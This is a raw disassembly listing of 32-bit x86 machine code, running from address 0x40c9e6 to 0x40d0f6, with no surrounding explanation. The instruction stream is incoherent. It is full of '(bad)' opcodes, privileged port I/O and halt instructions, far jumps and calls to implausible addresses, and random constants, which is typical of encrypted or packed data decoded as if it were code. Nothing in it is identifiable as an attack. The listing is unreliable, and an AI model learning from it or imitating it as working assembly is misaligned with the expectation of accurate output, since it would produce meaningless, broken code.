  40c9e6:	shr    DWORD PTR [ecx],0x36
  40c9e9:	xchg   ecx,eax
  40c9ea:	lahf   
  40c9eb:	adc    esp,edx
  40c9ed:	mov    dl,0x46
  40c9ef:	push   0x9d2d01a6
  40c9f4:	imul   esp,DWORD PTR [ebx+0x5d5d723a],0x4731edcf
  40c9fe:	lahf   
  40c9ff:	in     eax,0xfd
  40ca01:	enter  0x40ab,0x48
  40ca05:	push   edi
  40ca06:	mov    eax,0xc419fd6d
  40ca0b:	loop   0x40c9e6
  40ca0d:	stos   BYTE PTR es:[edi],al
  40ca0e:	js     0x40c9c2
  40ca10:	sbb    al,0xcd
  40ca12:	sub    al,0x7b
  40ca14:	adc    cl,cl
  40ca16:	sbb    al,0x4a
  40ca18:	(bad)  
  40ca19:	jns    0x40ca68
  40ca1b:	cli    
  40ca1c:	lods   eax,DWORD PTR ds:[esi]
  40ca1d:	das    
  40ca1e:	es ss retf 0x6a4e
  40ca23:	add    al,0xbd
  40ca25:	push   ebx
  40ca26:	xor    BYTE PTR ds:0x3eb1d077,dh
  40ca2c:	es js  0x40ca60
  40ca2f:	aas    
  40ca30:	pusha  
  40ca31:	xchg   DWORD PTR [edi-0x2786e727],esi
  40ca37:	pop    ebx
  40ca38:	sub    dl,BYTE PTR [eax-0x74]
  40ca3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca3c:	xor    al,0x92
  40ca3e:	hlt    
  40ca3f:	xchg   DWORD PTR [eax-0x76c4072],esi
  40ca45:	cmp    al,0x24
  40ca47:	and    edx,DWORD PTR [ebx+0x78]
  40ca4a:	outs   dx,DWORD PTR ds:[esi]
  40ca4b:	inc    ebx
  40ca4c:	jns    0x40ca04
  40ca4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca4f:	xchg   ebx,eax
  40ca50:	mov    esi,0xf063aa30
  40ca55:	inc    ecx
  40ca56:	imul   ecx,eax,0xffffffda
  40ca59:	cli    
  40ca5a:	and    eax,0xe4c1a8ed
  40ca5f:	jg     0x40ca30
  40ca61:	mov    ds:0x2c1045ab,eax
  40ca66:	sbb    ecx,DWORD PTR [esi+edx*1]
  40ca69:	fnsave ds:[edx+0xa]
  40ca6d:	mov    esi,0xc55fd51f
  40ca72:	pop    ss
  40ca73:	sbb    DWORD PTR [esi+esi*2+0x4e],ebx
  40ca77:	mov    ah,0xaf
  40ca79:	adc    eax,0xb80a96b2
  40ca7e:	pop    edi
  40ca7f:	xor    esi,DWORD PTR [edx+0x7bae8ad2]
  40ca85:	mov    edx,DWORD PTR [edx+0x2d]
  40ca88:	mov    dl,0xc9
  40ca8a:	pop    ebp
  40ca8b:	xor    BYTE PTR [ebp+0x2b],cl
  40ca8e:	cwde   
  40ca8f:	jg     0x40cb03
  40ca91:	sahf   
  40ca92:	sub    BYTE PTR [eax+0x7b],ch
  40ca95:	jb     0x40cade
  40ca97:	outs   dx,BYTE PTR ds:[esi]
  40ca98:	dec    edi
  40ca99:	inc    ebx
  40ca9a:	push   cs
  40ca9b:	adc    eax,0x8456d45e
  40caa0:	mov    ?,WORD PTR [eax-0x38]
  40caa3:	sar    BYTE PTR [esp+eax*8+0x3c81e8f8],1
  40caaa:	in     al,0x2d
  40caac:	pop    esi
  40caad:	ret    
  40caae:	mov    edi,0x94f095c0
  40cab3:	popf   
  40cab4:	fmul   st,st(1)
  40cab6:	add    esi,DWORD PTR [ebx]
  40cab8:	scas   eax,DWORD PTR es:[edi]
  40cab9:	cdq    
  40caba:	jo     0x40cabb
  40cabc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cabd:	mov    ecx,0xc9c9d102
  40cac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cac3:	or     eax,0x25283ba1
  40cac8:	retf   
  40cac9:	jmp    0x38bb7d9e
  40cace:	int3   
  40cacf:	nop
  40cad0:	aam    0x6c
  40cad2:	add    eax,0xbca3dfdd
  40cad7:	pop    si
  40cad9:	or     eax,0xa0ba4658
  40cade:	cli    
  40cadf:	sub    edx,esp
  40cae1:	jle    0x40cb48
  40cae3:	dec    edx
  40cae4:	xchg   DWORD PTR [eax-0x1],ecx
  40cae7:	xor    al,0x2a
  40cae9:	repnz lods eax,DWORD PTR ds:[esi]
  40caeb:	adc    BYTE PTR [edx],0x70
  40caee:	stos   BYTE PTR es:[edi],al
  40caef:	mov    DWORD PTR [eax+0x18573562],esp
  40caf5:	pop    ebp
  40caf6:	ins    BYTE PTR es:[edi],dx
  40caf7:	inc    esi
  40caf8:	mov    ah,0x51
  40cafa:	jae    0x40cabe
  40cafc:	jb     0x40cb74
  40cafe:	push   esi
  40caff:	jg     0x40caf8
  40cb01:	inc    ebp
  40cb02:	xor    al,0x13
  40cb04:	fwait
  40cb05:	mov    cl,0x8b
  40cb07:	imul   eax,DWORD PTR [eax],0xffffffcb
  40cb0a:	xchg   DWORD PTR [edi-0x31],ecx
  40cb0d:	or     DWORD PTR [ebp+0x73],edi
  40cb10:	cmp    eax,0xaa399b28
  40cb15:	leave  
  40cb16:	push   edi
  40cb17:	mov    ch,0xcd
  40cb19:	aad    0x98
  40cb1b:	aas    
  40cb1c:	outs   dx,BYTE PTR ds:[esi]
  40cb1d:	out    0xe1,al
  40cb1f:	cmp    eax,0xc1595cc0
  40cb24:	enter  0x42a2,0x7
  40cb28:	addr16 push ds
  40cb2a:	fs pushf 
  40cb2c:	pop    eax
  40cb2d:	lea    esi,[ebp+0x2ce5f4f4]
  40cb33:	call   0xecd3eb63
  40cb38:	xchg   ebx,eax
  40cb39:	mov    ecx,0x941f89ea
  40cb3e:	(bad)  
  40cb3f:	mov    es,WORD PTR [ebx+0x33]
  40cb42:	push   ecx
  40cb43:	mov    bh,0xe0
  40cb45:	dec    esi
  40cb46:	(bad)  
  40cb47:	std    
  40cb48:	pop    ebp
  40cb49:	das    
  40cb4a:	aad    0xdd
  40cb4c:	mov    WORD PTR [ecx+0x39],cs
  40cb4f:	push   0x7d
  40cb51:	mov    bl,0x2a
  40cb53:	xlat   BYTE PTR ds:[ebx]
  40cb54:	(bad)  
  40cb55:	sti    
  40cb56:	out    0x66,al
  40cb58:	call   0x817d1364
  40cb5d:	mov    edx,0x937740c0
  40cb62:	push   ss
  40cb63:	inc    edx
  40cb64:	arpl   WORD PTR [ecx+ecx*2+0x3b23c99c],cx
  40cb6b:	dec    ecx
  40cb6c:	fisubr DWORD PTR [ecx]
  40cb6e:	std    
  40cb6f:	mov    ds:0xbd474277,al
  40cb74:	scas   eax,DWORD PTR es:[edi]
  40cb75:	imul   ebp,DWORD PTR [ecx-0x7234395c],0x46d5f66c
  40cb7f:	les    esi,FWORD PTR [eax]
  40cb81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb82:	pop    ss
  40cb83:	sbb    DWORD PTR [esi+0x7bcb5aeb],edi
  40cb89:	push   edx
  40cb8a:	xchg   edx,eax
  40cb8b:	inc    edi
  40cb8c:	leave  
  40cb8d:	mov    dh,0x66
  40cb8f:	xchg   edx,eax
  40cb90:	stc    
  40cb91:	imul   edx,DWORD PTR [ebx],0xffffffcd
  40cb94:	pop    edx
  40cb95:	xlat   BYTE PTR ds:[ebx]
  40cb96:	sahf   
  40cb97:	xor    esi,DWORD PTR [edi-0x22]
  40cb9a:	and    BYTE PTR [esp+ebx*4-0x34],bh
  40cb9e:	test   eax,0x54ff1706
  40cba3:	lods   eax,DWORD PTR ds:[esi]
  40cba4:	jns    0x40cc16
  40cba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cba7:	add    ch,BYTE PTR [ebp+0x15]
  40cbaa:	dec    edx
  40cbab:	sbb    dl,bl
  40cbad:	ins    BYTE PTR es:[edi],dx
  40cbae:	inc    esi
  40cbaf:	imul   BYTE PTR [edx]
  40cbb1:	xchg   edi,eax
  40cbb2:	test   DWORD PTR [eax+esi*8],ebx
  40cbb5:	jmp    0x3c6c91e5
  40cbba:	sti    
  40cbbb:	ror    BYTE PTR [ebx+ebp*1-0xad249cc],cl
  40cbc2:	inc    ecx
  40cbc3:	popa   
  40cbc4:	xor    eax,ebx
  40cbc6:	add    eax,0x8459952f
  40cbcb:	mov    BYTE PTR [ebp-0x42b66488],al
  40cbd1:	mov    eax,ebx
  40cbd3:	mov    ds:0x27196e55,al
  40cbd8:	in     al,0x83
  40cbda:	dec    esp
  40cbdb:	pop    ebx
  40cbdc:	adc    al,0x53
  40cbde:	(bad)  
  40cbdf:	out    0x53,eax
  40cbe1:	mov    dh,0xd5
  40cbe3:	add    eax,0x87529e4f
  40cbe8:	jg     0x40cb70
  40cbea:	mov    al,0xc
  40cbec:	pusha  
  40cbed:	or     ebp,DWORD PTR [ebp-0x44]
  40cbf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbf1:	inc    edi
  40cbf2:	sub    al,0x3b
  40cbf4:	mov    WORD PTR [edi],?
  40cbf6:	in     al,0x74
  40cbf8:	retf   0xb106
  40cbfb:	lds    esp,FWORD PTR [ebx+0x52d938b7]
  40cc01:	and    eax,0x64dac59b
  40cc06:	bound  ebx,QWORD PTR [ecx+0x6e]
  40cc09:	mov    ecx,0x8f910c17
  40cc0e:	xor    cl,BYTE PTR [ebx-0x23]
  40cc11:	jnp    0x40cc42
  40cc13:	pop    es
  40cc14:	and    dh,BYTE PTR [ebx+0x4df2ac74]
  40cc1a:	retf   0x5c32
  40cc1d:	retf   
  40cc1e:	aaa    
  40cc1f:	pop    ebp
  40cc20:	dec    edi
  40cc21:	in     eax,dx
  40cc22:	push   edi
  40cc23:	push   esp
  40cc24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc25:	in     eax,dx
  40cc26:	lods   eax,DWORD PTR ds:[esi]
  40cc27:	data16 lods al,BYTE PTR ds:[esi]
  40cc29:	mov    dh,0xb5
  40cc2b:	pushf  
  40cc2c:	pop    esi
  40cc2d:	dec    esi
  40cc2e:	xor    BYTE PTR [edx+0x18db048d],bh
  40cc34:	dec    edx
  40cc35:	mov    al,0xf4
  40cc37:	dec    esi
  40cc38:	fwait
  40cc39:	pop    ebp
  40cc3a:	nop
  40cc3b:	pushf  
  40cc3c:	lea    eax,es:[edx]
  40cc3f:	rcr    DWORD PTR [ebx],cl
  40cc41:	pop    ebx
  40cc42:	in     eax,0xbf
  40cc44:	shl    DWORD PTR [di],1
  40cc47:	and    ecx,edi
  40cc49:	mov    ds:0xee41df49,al
  40cc4e:	pop    ds
  40cc4f:	mov    BYTE PTR [edx+edx*4-0x1f],bl
  40cc53:	into   
  40cc54:	idiv   al
  40cc56:	cmc    
  40cc57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc58:	xchg   esp,eax
  40cc59:	mov    esi,0xd6ac0339
  40cc5e:	sub    DWORD PTR [edx+0x14051910],edi
  40cc64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc65:	and    BYTE PTR fs:[esi+0x47eff02b],dl
  40cc6c:	mov    al,0x81
  40cc6e:	push   ss
  40cc6f:	les    ebp,FWORD PTR [esi-0x1ba81af2]
  40cc75:	jmp    DWORD PTR ds:0x67f46fff
  40cc7b:	xchg   ebp,eax
  40cc7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc7d:	mov    ss,WORD PTR ds:0x8c3f60d8
  40cc83:	shr    BYTE PTR [ebx-0x2eec59a7],0xa7
  40cc8a:	int3   
  40cc8b:	aas    
  40cc8c:	imul   esp,DWORD PTR [edi+0x48],0x7a
  40cc90:	jmp    0x9f67:0x5f805542
  40cc97:	add    esi,edx
  40cc99:	xchg   DWORD PTR [esi],eax
  40cc9b:	and    ebx,DWORD PTR [edi+0x22966e28]
  40cca1:	jbe    0x40cc6c
  40cca3:	and    dl,cl
  40cca5:	jbe    0x40cce8
  40cca7:	imul   esi,DWORD PTR [ecx],0xffffff9c
  40ccaa:	inc    edi
  40ccab:	test   al,0x3
  40ccad:	or     ebp,ebx
  40ccaf:	test   al,0xf1
  40ccb1:	mov    ah,0xd3
  40ccb3:	mov    dl,0x29
  40ccb5:	in     eax,0x7c
  40ccb7:	and    eax,DWORD PTR [eax+0x3b]
  40ccba:	stos   DWORD PTR es:[edi],eax
  40ccbb:	sbb    ecx,DWORD PTR [esi+0x6598aed]
  40ccc1:	out    dx,al
  40ccc2:	ja     0x40ccdc
  40ccc4:	xchg   BYTE PTR [ecx+0x57],ah
  40ccc7:	retf   
  40ccc8:	or     esi,DWORD PTR [eax]
  40ccca:	push   edx
  40cccb:	fst    st(1)
  40cccd:	mov    ecx,0x6e3a272c
  40ccd2:	dec    eax
  40ccd3:	les    esp,FWORD PTR [edi-0x41c58c99]
  40ccd9:	nop
  40ccda:	push   cs
  40ccdb:	xor    BYTE PTR [ecx-0x30931752],ch
  40cce1:	fnstenv [ecx+0x2e]
  40cce4:	enter  0xa50a,0x8f
  40cce8:	xlat   BYTE PTR ds:[ebx]
  40cce9:	lahf   
  40ccea:	xor    BYTE PTR [esi],dl
  40ccec:	cdq    
  40cced:	jge    0x40cc9f
  40ccef:	adc    eax,0x57e80e2
  40ccf4:	mov    edi,eax
  40ccf6:	int    0x7c
  40ccf8:	sub    BYTE PTR fs:[ebx+0x11d4a27f],ah
  40ccff:	jb     0x40cc88
  40cd01:	xchg   edx,eax
  40cd02:	push   0x8be9076
  40cd07:	sbb    BYTE PTR [eax+eax*2+0x21],dl
  40cd0b:	and    eax,esp
  40cd0d:	scas   al,BYTE PTR es:[edi]
  40cd0e:	cmp    al,0xfc
  40cd10:	hlt    
  40cd11:	icebp  
  40cd12:	int    0xe4
  40cd14:	pop    edi
  40cd15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd16:	or     edx,eax
  40cd18:	clc    
  40cd19:	lods   eax,DWORD PTR ds:[esi]
  40cd1a:	xor    BYTE PTR [edi],bl
  40cd1c:	nop
  40cd1d:	add    ch,dl
  40cd1f:	push   ebp
  40cd20:	mov    eax,eax
  40cd22:	mov    eax,0x910a88c5
  40cd27:	loopne 0x40cd89
  40cd29:	sub    DWORD PTR [ecx+0x92c38f6],ecx
  40cd2f:	popf   
  40cd30:	mov    BYTE PTR [ebp-0xfb4dfe8],bl
  40cd36:	out    0x4e,al
  40cd38:	jmp    0xda8c:0x44de3e88
  40cd3f:	ss aam 0xb0
  40cd42:	cli    
  40cd43:	rcl    DWORD PTR [ecx+eax*8],1
  40cd46:	test   al,0x9f
  40cd48:	jp     0x40cd0b
  40cd4a:	inc    esi
  40cd4b:	stos   BYTE PTR es:[edi],al
  40cd4c:	jle    0x40ccde
  40cd4e:	mov    gs,WORD PTR [ebx-0x2144893a]
  40cd54:	jns    0x40cda6
  40cd56:	aad    0xb
  40cd58:	dec    ebx
  40cd59:	dec    ebp
  40cd5a:	retf   0x9bb9
  40cd5d:	call   ebp
  40cd5f:	in     eax,dx
  40cd60:	inc    ebp
  40cd61:	fmul   DWORD PTR [edi+eax*4+0x1d348e13]
  40cd68:	not    BYTE PTR [ebp+0x13]
  40cd6b:	cmp    al,0x48
  40cd6d:	adc    esi,ebp
  40cd6f:	clc    
  40cd70:	adc    BYTE PTR [ebp+0x27],bl
  40cd73:	mov    cl,0x4
  40cd75:	lods   eax,DWORD PTR ds:[esi]
  40cd76:	imul   edx,DWORD PTR [ecx-0x37],0x9e852a8a
  40cd7d:	retf   0xbbb1
  40cd80:	test   DWORD PTR [esi+0x7],edi
  40cd83:	ja     0x40cd6a
  40cd85:	jl     0x40cde8
  40cd87:	mov    esi,0xa5ccbf8d
  40cd8c:	retf   
  40cd8d:	in     al,0x46
  40cd8f:	jecxz  0x40cd26
  40cd91:	jp     0x40cd4c
  40cd93:	lahf   
  40cd94:	jb     0x40cd76
  40cd96:	in     al,dx
  40cd97:	rcl    DWORD PTR [eax+ebx*8+0x1b],cl
  40cd9b:	xchg   edi,eax
  40cd9c:	inc    eax
  40cd9d:	adc    al,0xd9
  40cd9f:	push   eax
  40cda0:	jmp    0x883b:0xb8a99081
  40cda7:	sbb    al,al
  40cda9:	dec    ebp
  40cdaa:	add    esp,DWORD PTR [edi+0x39]
  40cdad:	mov    ds:0x4be6d308,al
  40cdb2:	xchg   edi,eax
  40cdb3:	stc    
  40cdb4:	mov    ds:0xfd8c38aa,eax
  40cdb9:	push   ebx
  40cdba:	rol    BYTE PTR [edx+0x766d8c62],1
  40cdc0:	out    dx,al
  40cdc1:	push   ss
  40cdc2:	mov    ch,0xee
  40cdc4:	loope  0x40ce09
  40cdc6:	sub    al,0xde
  40cdc8:	inc    ebx
  40cdc9:	jns    0x40cd94
  40cdcb:	fisttp QWORD PTR [ecx-0x78]
  40cdce:	cmp    al,0xca
  40cdd0:	xchg   esi,eax
  40cdd1:	add    bl,al
  40cdd3:	sbb    eax,0xf51fbaca
  40cdd8:	push   edi
  40cdd9:	in     al,0x43
  40cddb:	jbe    0x40cdc8
  40cddd:	push   es
  40cdde:	mov    eax,0x1272f24f
  40cde3:	push   es
  40cde4:	inc    ecx
  40cde5:	stos   DWORD PTR es:[edi],eax
  40cde6:	aaa    
  40cde7:	lods   al,BYTE PTR ds:[esi]
  40cde8:	in     eax,0x74
  40cdea:	stos   DWORD PTR es:[edi],eax
  40cdeb:	aas    
  40cdec:	imul   ebp,DWORD PTR [bp+si],0x51
  40cdf0:	das    
  40cdf1:	jns    0x40cda2
  40cdf3:	and    al,dl
  40cdf5:	cmp    eax,0xdae2ec9c
  40cdfa:	enter  0xa33b,0xdd
  40cdfe:	aaa    
  40cdff:	mov    ecx,0xc087ed76
  40ce04:	repnz cmp esi,DWORD PTR [ebx+0xa]
  40ce08:	imul   edx
  40ce0a:	aam    0x7b
  40ce0c:	xor    al,cl
  40ce0e:	pop    ecx
  40ce0f:	loopne 0x40ce6b
  40ce11:	sti    
  40ce12:	cwde   
  40ce13:	mov    bl,0xb3
  40ce15:	mov    DWORD PTR [ebx+0x26],ebp
  40ce18:	mov    dh,0xc
  40ce1a:	dec    eax
  40ce1b:	inc    edx
  40ce1c:	ins    DWORD PTR es:[edi],dx
  40ce1d:	dec    DWORD PTR [edx]
  40ce1f:	push   esp
  40ce20:	inc    eax
  40ce21:	xor    BYTE PTR [ebp-0x46],dh
  40ce24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce25:	jmp    0x40ce04
  40ce27:	pop    eax
  40ce28:	cmp    al,0x46
  40ce2a:	add    BYTE PTR [esi+0x31ee3217],0xcd
  40ce31:	jae    0x40ce0f
  40ce33:	or     ecx,DWORD PTR [eax+0x3f]
  40ce36:	jno    0x40cdf7
  40ce38:	mov    dh,0xf9
  40ce3a:	cmp    bh,BYTE PTR [ebx]
  40ce3c:	mov    ds:0x91762e26,al
  40ce41:	retf   0xa2ef
  40ce44:	daa    
  40ce45:	jmp    DWORD PTR [ecx]
  40ce47:	adc    bh,bl
  40ce49:	xor    BYTE PTR [ecx+0x225da679],0x5e
  40ce50:	aas    
  40ce51:	out    0xb4,al
  40ce53:	push   ds
  40ce54:	push   edi
  40ce55:	adc    ecx,DWORD PTR [ebx-0x24a103b8]
  40ce5b:	push   ss
  40ce5c:	sti    
  40ce5d:	or     ah,BYTE PTR [ebx]
  40ce5f:	push   ss
  40ce60:	dec    esi
  40ce61:	repz mov bh,0xb7
  40ce64:	retf   
  40ce65:	inc    esi
  40ce66:	clc    
  40ce67:	mov    al,ds:0xfbb8455f
  40ce6c:	popa   
  40ce6d:	mov    al,al
  40ce6f:	fcomi  st,st(0)
  40ce71:	jl     0x40cec4
  40ce73:	and    DWORD PTR ds:0xb608d761,ebx
  40ce79:	jae    0x40ce75
  40ce7b:	lahf   
  40ce7c:	loopne 0x40ce0f
  40ce7e:	(bad)  
  40ce7f:	call   0xb5ea8fe9
  40ce84:	shl    bh,1
  40ce86:	repnz imul ebp,DWORD PTR [ecx+0x32a38129],0xffffffca
  40ce8e:	jle    0x40ce23
  40ce90:	(bad)  
  40ce91:	mov    bl,0x8
  40ce93:	es adc eax,0xdfc5be43
  40ce99:	pop    ss
  40ce9a:	out    0x55,eax
  40ce9c:	sahf   
  40ce9d:	jbe    0x40cef9
  40ce9f:	pop    ebx
  40cea0:	fild   DWORD PTR [ecx+0x5cc9dd55]
  40cea6:	push   ds
  40cea7:	cmp    BYTE PTR [ebp-0x3f909dde],ah
  40cead:	sub    eax,0x7477aba1
  40ceb2:	xlat   BYTE PTR ds:[ebx]
  40ceb3:	xor    eax,0x9cdd9b6b
  40ceb8:	xor    al,BYTE PTR [ebx-0x20]
  40cebb:	jb     0x40cecc
  40cebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cebe:	push   esi
  40cebf:	sub    DWORD PTR [edi],0xffffff8b
  40cec2:	in     al,0x84
  40cec4:	xchg   esi,eax
  40cec5:	sti    
  40cec6:	mov    bh,0xb5
  40cec8:	cld    
  40cec9:	into   
  40ceca:	fisubr DWORD PTR [edx-0x26dd1378]
  40ced0:	sub    DWORD PTR [ebx],edi
  40ced2:	mov    BYTE PTR [edi-0x19],al
  40ced5:	cmp    ah,BYTE PTR [eax-0x5d633701]
  40cedb:	xor    ch,dh
  40cedd:	sbb    BYTE PTR [ebx+0x50],ch
  40cee0:	call   FWORD PTR [edi-0x142a965b]
  40cee6:	cmp    al,bh
  40cee8:	(bad)  
  40cee9:	mov    ebp,0xffa2f203
  40ceee:	hlt    
  40ceef:	iret   
  40cef0:	les    esp,FWORD PTR [edx+0x714202c2]
  40cef6:	pushf  
  40cef7:	sbb    ah,BYTE PTR [edi]
  40cef9:	jae    0x40cf07
  40cefb:	sub    al,BYTE PTR [ebp-0x19e9e401]
  40cf01:	sub    eax,0xfa2d840b
  40cf06:	pop    esi
  40cf07:	(bad)  
  40cf08:	mov    edx,0xbcd6ae34
  40cf0d:	shufps xmm4,XMMWORD PTR [ebx-0x25],0x3e
  40cf12:	mov    BYTE PTR ss:[edx+0x38],ch
  40cf16:	lahf   
  40cf17:	daa    
  40cf18:	pop    ebp
  40cf19:	pop    ebx
  40cf1a:	pop    ds
  40cf1b:	popa   
  40cf1c:	fmul   DWORD PTR [ebx-0x122b3588]
  40cf22:	(bad)  
  40cf23:	jne    0x40cf7d
  40cf25:	cmp    al,0x1b
  40cf27:	adc    eax,0xed83dd48
  40cf2c:	mov    ah,BYTE PTR [ecx+0x35]
  40cf2f:	ja     0x40cf04
  40cf31:	mov    ah,0xe
  40cf33:	das    
  40cf34:	lock add eax,0x7e9e7814
  40cf3a:	shr    BYTE PTR [esi+0x40],1
  40cf3d:	dec    edi
  40cf3e:	out    0x60,al
  40cf40:	lods   al,BYTE PTR ds:[esi]
  40cf41:	push   0xffffffc0
  40cf43:	add    DWORD PTR [eax+0x5c],0xffffffca
  40cf47:	xchg   esi,eax
  40cf48:	mov    ecx,0x5a8a7115
  40cf4d:	mov    edi,0xa11dbed1
  40cf52:	ss mov edi,0x1a6f86e8
  40cf58:	push   eax
  40cf59:	mov    bh,dh
  40cf5b:	(bad)  
  40cf5c:	retf   
  40cf5d:	cmp    ebx,DWORD PTR [eax]
  40cf5f:	iret   
  40cf60:	mov    ebp,0xa5b035cf
  40cf65:	out    0x4f,eax
  40cf67:	mov    bh,0xd6
  40cf69:	js     0x40cfba
  40cf6b:	das    
  40cf6c:	mov    ch,0x61
  40cf6e:	dec    ebp
  40cf6f:	push   esi
  40cf70:	and    dl,BYTE PTR [edx]
  40cf72:	mov    edx,0x754fe386
  40cf77:	lahf   
  40cf78:	xchg   ebx,eax
  40cf79:	push   ecx
  40cf7a:	retf   
  40cf7b:	daa    
  40cf7c:	retf   0xb75e
  40cf7f:	icebp  
  40cf80:	jnp    0x40cfd0
  40cf82:	mov    al,0xea
  40cf84:	repz jmp 0x7dab46be
  40cf8a:	inc    edi
  40cf8b:	pop    ebx
  40cf8c:	push   0xffffff93
  40cf8e:	repnz and BYTE PTR [eax-0x3f],ah
  40cf92:	inc    esi
  40cf93:	aaa    
  40cf94:	je     0x40cfcc
  40cf96:	cmp    DWORD PTR [edx+0x38951477],ecx
  40cf9c:	pop    ecx
  40cf9d:	scas   al,BYTE PTR es:[edi]
  40cf9e:	pop    esi
  40cf9f:	(bad)  
  40cfa0:	(bad)  
  40cfa3:	pop    ebp
  40cfa4:	call   0x10179d32
  40cfa9:	imul   ebx,DWORD PTR [edx],0xffffffdc
  40cfac:	sub    ah,BYTE PTR [edx]
  40cfae:	stos   BYTE PTR es:[edi],al
  40cfaf:	std    
  40cfb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfb1:	aas    
  40cfb2:	dec    ecx
  40cfb3:	push   0x1bed0d4
  40cfb8:	dec    esp
  40cfb9:	push   esi
  40cfba:	xor    BYTE PTR [ebx+0x62],ch
  40cfbd:	mov    ebp,0x66bf20a0
  40cfc2:	xchg   edi,eax
  40cfc3:	mov    bh,0xb8
  40cfc5:	fist   DWORD PTR ds:0x76f07519
  40cfcb:	pop    ecx
  40cfcc:	frstor [edi-0x5c]
  40cfcf:	xchg   BYTE PTR [edi],dl
  40cfd1:	fnstsw WORD PTR ss:[ebx-0x80]
  40cfd5:	jne    0x40cfce
  40cfd7:	mov    esp,0x61c34949
  40cfdc:	stos   DWORD PTR es:[edi],eax
  40cfdd:	loop   0x40cfbf
  40cfdf:	inc    esp
  40cfe0:	cmp    al,BYTE PTR [edx]
  40cfe2:	sub    DWORD PTR [ebx],esp
  40cfe4:	sbb    eax,DWORD PTR [ebp+ebp*1+0x2c]
  40cfe8:	inc    esi
  40cfe9:	xchg   ecx,eax
  40cfea:	iret   
  40cfeb:	pop    es
  40cfec:	popa   
  40cfed:	sbb    al,0x3a
  40cfef:	sbb    DWORD PTR [ecx],ebx
  40cff1:	or     DWORD PTR [esi+0x7a],0x42
  40cff5:	pop    es
  40cff6:	mov    cs,WORD PTR [esi+edx*4-0xa]
  40cffa:	dec    ebp
  40cffb:	sub    al,BYTE PTR [esi+0x71d5e73b]
  40d001:	je     0x40d019
  40d003:	mov    ecx,0xdbfdfcdc
  40d008:	xor    edx,eax
  40d00a:	rol    ebp,1
  40d00c:	stos   DWORD PTR es:[edi],eax
  40d00d:	(bad)  
  40d00e:	jo     0x40d05a
  40d010:	ja     0x40d07f
  40d012:	repnz rcr BYTE PTR [esi],1
  40d015:	jb     0x40d07b
  40d017:	scas   al,BYTE PTR es:[edi]
  40d018:	not    DWORD PTR [esi-0x55f3e6d2]
  40d01e:	cmp    BYTE PTR [ebx+0x8],bh
  40d021:	xor    ch,0x12
  40d024:	jns    0x40d065
  40d026:	hlt    
  40d027:	sub    BYTE PTR [edi-0x36],al
  40d02a:	jmp    0xe798a35a
  40d02f:	sahf   
  40d030:	add    bh,BYTE PTR [eax]
  40d032:	dec    edx
  40d033:	jecxz  0x40cffd
  40d035:	pushf  
  40d036:	(bad)  [esi+0x53105398]
  40d03c:	mov    fs,WORD PTR [edx+0x1b321db5]
  40d042:	mov    edi,0x46241b03
  40d047:	inc    ebx
  40d048:	(bad)  
  40d04b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d04c:	inc    edx
  40d04d:	mov    dh,0xbe
  40d04f:	push   esp
  40d050:	pop    esi
  40d051:	mov    ah,0x4b
  40d053:	mov    ds:0xcc92c66f,eax
  40d058:	sbb    bl,bh
  40d05a:	add    esp,DWORD PTR ds:[edi+eax*4-0x3508683]
  40d062:	jo     0x40d0b5
  40d064:	ret    
  40d065:	into   
  40d066:	bound  ecx,QWORD PTR [ebp+0x31]
  40d069:	mov    dh,0x6d
  40d06b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d06c:	sti    
  40d06d:	mov    edi,0xf02fc087
  40d072:	pop    ebp
  40d073:	sbb    bl,BYTE PTR [edx]
  40d075:	mov    esi,0x73b0dd4
  40d07a:	xchg   ecx,eax
  40d07b:	cld    
  40d07c:	cwde   
  40d07d:	and    al,0xab
  40d07f:	in     eax,0xf2
  40d081:	repnz mov ecx,0x6738450b
  40d087:	or     ecx,ecx
  40d089:	retf   
  40d08a:	xor    esi,esp
  40d08c:	cli    
  40d08d:	popf   
  40d08e:	xor    eax,0x339b76d
  40d093:	aas    
  40d094:	pushf  
  40d095:	int    0x15
  40d097:	or     eax,0x3a3ce5a9
  40d09c:	push   edi
  40d09d:	adc    dh,al
  40d09f:	lahf   
  40d0a0:	clc    
  40d0a1:	and    eax,0x45c46c69
  40d0a6:	adc    cl,dl
  40d0a8:	mov    ds:0x22ed1fa3,al
  40d0ad:	add    ebx,DWORD PTR [eax]
  40d0af:	retf   
  40d0b0:	iret   
  40d0b1:	sbb    al,0x8
  40d0b3:	jb     0x40d0ac
  40d0b5:	pop    ecx
  40d0b6:	xchg   edx,eax
  40d0b7:	jge    0x40d0c6
  40d0b9:	call   FWORD PTR [eax-0x59efabe3]
  40d0bf:	cmp    DWORD PTR ds:0xc0768b04,edi
  40d0c5:	call   0x75f01a7
  40d0ca:	stos   DWORD PTR es:[edi],eax
  40d0cb:	aas    
  40d0cc:	or     eax,0xdb970818
  40d0d1:	ror    BYTE PTR [ecx],cl
  40d0d3:	mov    bh,0x80
  40d0d5:	xor    ebx,DWORD PTR [ecx+0x5afa43ea]
  40d0db:	test   ebp,edi
  40d0dd:	adc    al,0xa1
  40d0df:	std    
  40d0e0:	or     BYTE PTR [ecx-0x7],al
  40d0e3:	xchg   esp,eax
  40d0e4:	lea    eax,[ecx-0x70eef68a]
  40d0ea:	dec    ebp
  40d0eb:	mov    ah,0x5a
  40d0ed:	inc    eax
  40d0ee:	int    0x16
  40d0f0:	fdivr  QWORD PTR [esi-0x38]
  40d0f3:	cwde   
  40d0f4:	cmp    BYTE PTR [ecx],ch
  40d0f6:	into   
